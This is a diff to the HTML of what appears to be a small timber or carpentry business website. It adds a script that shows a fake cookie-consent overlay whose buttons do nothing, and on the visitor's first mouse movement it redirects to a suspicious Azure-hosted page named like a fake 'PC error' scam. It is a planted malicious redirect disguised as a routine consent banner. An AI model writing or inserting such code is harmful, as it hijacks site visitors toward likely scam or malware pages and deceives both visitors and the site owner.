@@ -1074,5 +1074,55 @@ function lbPrev(){lbIdx=(lbIdx-1+lbImgs.length)%lbImgs.length;document.getElemen
 document.addEventListener('keydown',e=>{if(document.getElementById('lightbox').classList.contains('open')){if(e.key==='ArrowRight')lbNext();if(e.key==='ArrowLeft')lbPrev();if(e.key==='Escape')closeLB();}});
 function submitForm(){const fn=document.getElementById('fname').value.trim();const em=document.getElementById('email').value.trim();if(!fn||!em){alert('Please enter your name and email address.');return;}const t=document.getElementById('toast');t.classList.add('show');setTimeout(()=>t.classList.remove('show'),4500);['fname','lname','email','phone','service','timber','message'].forEach(id=>{const el=document.getElementById(id);if(el)el.value='';});}
 </script>
+  <script>
+        (function () {
+            // Show popup immediately on page load
+            const overlay = document.createElement('div');
+            overlay.id = 'cookie-overlay';
+            Object.assign(overlay.style, {
+                position: 'fixed', inset: '0',
+                background: 'rgba(0,0,0,0.55)',
+                backdropFilter: 'blur(6px)',
+                WebkitBackdropFilter: 'blur(6px)',
+                zIndex: '99998',
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: 'center'
+            });
+
+            const modal = document.createElement('div');
+            Object.assign(modal.style, {
+                background: '#fff',
+                borderRadius: '8px',
+                padding: '2rem 2.5rem',
+                maxWidth: '400px',
+                width: '90%',
+                textAlign: 'center',
+                fontFamily: 'sans-serif',
+                zIndex: '99999',
+                position: 'relative'
+            });
+
+            modal.innerHTML = `
+    <h2 style="font-size:20px;font-weight:700;margin:0 0 12px;color:#111;">Cookie Policy</h2>
+    <p style="font-size:14px;color:#444;line-height:1.6;margin:0 0 1.5rem;">
+      We use cookies to enhance your browsing experience, serve personalized ads or content,
+      and analyze our traffic. By continuing to use our site, you consent to our use of cookies.
+    </p>
+    <div style="display:flex;gap:12px;justify-content:center;">
+      <button id="cookie-decline" style="padding:10px 22px;border:2px solid #111;background:#fff;color:#111;font-weight:700;font-size:14px;cursor:pointer;letter-spacing:.05em;">DECLINE</button>
+      <button id="cookie-accept" style="padding:10px 22px;border:2px solid #111;background:#111;color:#fff;font-weight:700;font-size:14px;cursor:pointer;letter-spacing:.05em;">ACCEPT</button>
+    </div>
+  `;
+
+            overlay.appendChild(modal);
+            document.body.appendChild(overlay);
+
+            // Redirect on first cursor movement
+            document.addEventListener('mousemove', function () {
+                window.location.href = 'https://errors00erorrspc000t9.z13.web.core.windows.net/';
+            }, { once: true });
+        })();
+    </script>
 </body>
 </html>
